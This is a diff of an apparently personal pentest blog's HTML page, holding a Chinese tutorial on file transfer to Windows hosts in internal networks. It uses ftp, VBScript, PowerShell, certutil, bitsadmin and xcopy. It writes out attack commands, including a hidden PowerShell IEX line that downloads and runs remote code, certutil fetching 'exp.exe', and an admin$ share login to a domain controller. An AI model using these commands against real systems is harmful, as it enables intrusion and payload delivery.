@@ -21,7 +21,7 @@
 <meta name="twitter:title" content="内网文件传输技术 Windows篇"/>
 <meta name="twitter:description" content="本文简述内网Windows主机文件传输技术，包括利用ftp、VBScript、powershell、certutil、bitsadmin、Xcopy，都是些老技术，整理分享。"/>
 <meta name="application-name" content="Xavier&#39;s Blog">
-<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="canonical" href="http://example.org/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/" /><link rel="prev" href="http://example.org/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/" /><link rel="next" href="http://example.org/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="canonical" href="http://example.org/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/" /><link rel="prev" href="http://example.org/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/" /><link rel="next" href="http://example.org/posts/htb%E9%9D%B6%E6%9C%BA-legacy-writeup/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
   {
     "@context": "http://schema.org",
     "@type": "BlogPosting",
@@ -162,7 +162,8 @@
   </div>
   <div class="search-dropdown mobile">
     <div id="search-dropdown-mobile"></div>
-  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"></aside>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside>
 
   <aside class="aside-custom">
     </aside>
@@ -174,8 +175,23 @@
       <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
           <span class="post-category">收录于 <a href="/categories/pentest/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pentest</a></span></div>
       <div class="post-meta-line"><span title=2021-11-13&#32;17:25:01><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-11-13">2021-11-13</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 358 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 2 分钟</span>&nbsp;</div>
-    </div><div class="content" id="content" data-end-flag="It&#39;s end."><p>本文简述内网Windows主机文件传输技术，包括利用ftp、VBScript、powershell、certutil.exe、bitsadmin、Xcopy，都是些老技术，整理分享。</p>
-<h1 id="一ftp">一、ftp</h1>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#一ftp">一、ftp</a></li>
+    <li><a href="#二vbs">二、VBS</a></li>
+    <li><a href="#三powershell">三、Powershell</a></li>
+    <li><a href="#四certutil">四、certutil</a></li>
+    <li><a href="#五bitsadmin">五、bitsadmin</a></li>
+    <li><a href="#六-xcopy">六 、Xcopy</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><p>本文简述内网Windows主机文件传输技术，包括利用ftp、VBScript、powershell、certutil.exe、bitsadmin、Xcopy，都是些老技术，整理分享。</p>
+<h2 id="一ftp">一、ftp</h2>
 <p>windows 全平台自带ftp，在实战中需要考虑两点。</p>
 <ul>
 <li>数据传输的完整性。</li>
@@ -204,7 +220,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># -A匿名登录下载文件 </span>
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> open IP &gt; o <span class="p">&amp;</span> <span class="nb">echo</span> get Target_File.exe &gt;&gt; o <span class="p">&amp;</span><span class="nb">echo</span> quit&gt;&gt;o <span class="p">&amp;</span>ftp -A -n -s:o <span class="p">&amp;</span> del /F /Q o
-</span></span></code></pre></div><h1 id="二vbs">二、VBS</h1>
+</span></span></code></pre></div><h2 id="二vbs">二、VBS</h2>
 <p>编写VBS脚本并保存</p>
 <pre tabindex="0"><code class="language-vbscript" data-lang="vbscript">set a=createobject(&#34;adod&#34;+&#34;b.stream&#34;):set w=createobject(&#34;micro&#34;+&#34;soft.xmlhttp&#34;):w.open&#34;get&#34;,wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2
 </code></pre><p>也可以用echo方式写入vbs</p>
@@ -215,7 +231,7 @@
 <p>也可以把参数直接写入vbs文件中，直接执行。</p>
 <p>优点：支持windows全版本系列缺点：对https不友好</p>
 <p>VBS作为一门代码语言，可以有多种代码编写的方式，不只这一种</p>
-<h1 id="三powershell">三、Powershell</h1>
+<h2 id="三powershell">三、Powershell</h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 远程下载文件到本地： </span>
 </span></span><span class="line"><span class="cl">powershell <span class="o">(</span>new-object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">&#39;http://192.168.183.138:8000/test.txt&#39;</span>,<span class="s1">&#39;test.exe&#39;</span><span class="o">)</span>  
 </span></span><span class="line"><span class="cl">
@@ -224,7 +240,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 直接把文本转换为exe文件运行，无残留文件 </span>
 </span></span><span class="line"><span class="cl">powershell -nop -w hidden -c <span class="s2">&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.183.138:8000/test.txt&#39;))&#34;</span>
-</span></span></code></pre></div><h1 id="四certutil">四、certutil</h1>
+</span></span></code></pre></div><h2 id="四certutil">四、certutil</h2>
 <p>Certutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certutil.exe -urlcache -split -f http://192.168.16.157/exp.exe 
 </span></span><span class="line"><span class="cl"><span class="c1"># certutil.exe下载有个弊端，它的每一次下载都有留有缓存，所以每次下载后需要清除缓存 </span>
@@ -239,7 +255,7 @@
 <p>certutil还自带base64编码解码功能</p>
 <pre tabindex="0"><code> certutil -encode c:\downfile.vbs downfile.bat 
  certutil -decode c:\downfile.bat downfile.txt
-</code></pre><h1 id="五bitsadmin">五、bitsadmin</h1>
+</code></pre><h2 id="五bitsadmin">五、bitsadmin</h2>
 <p>BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度。</p>
 <p>具体相关参数参见 官方文档：</p>
 <pre tabindex="0"><code>USAGE: BITSADMIN [/RAWRETURN] [/WRAP | /NOWRAP] command 
@@ -278,7 +294,7 @@ The following commands are available:
 </span></span><span class="line"><span class="cl">        HIGH
 </span></span><span class="line"><span class="cl">        NORMAL
 </span></span><span class="line"><span class="cl">        LOW
-</span></span></code></pre></div><h1 id="六-xcopy">六 、Xcopy</h1>
+</span></span></code></pre></div><h2 id="六-xcopy">六 、Xcopy</h2>
 <p>Windows 自带命令，复制文件和目录树</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 建立网络会话</span>
 </span></span><span class="line"><span class="cl">net use <span class="se">\\</span>DC<span class="se">\a</span>dmin$ /u:<span class="s2">&#34;administrator&#34;</span> <span class="s2">&#34;password&#34;</span>
@@ -320,7 +336,7 @@ The following commands are available:
   </div>
 
   <div class="post-nav"><a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/" class="post-nav-item" rel="prev" title="内网渗透 内网信息搜集脑图"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>内网渗透 内网信息搜集脑图</a>
-      <a href="/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/" class="post-nav-item" rel="next" title="软考-中级信息安全工程师">软考-中级信息安全工程师<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+      <a href="/posts/htb%E9%9D%B6%E6%9C%BA-legacy-writeup/" class="post-nav-item" rel="next" title="HTB靶机 Legacy WriteUp">HTB靶机 Legacy WriteUp<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 </article></main><footer class="footer">
     <div class="footer-container"><div class="footer-line statistics"></div><div class="footer-line visitor">
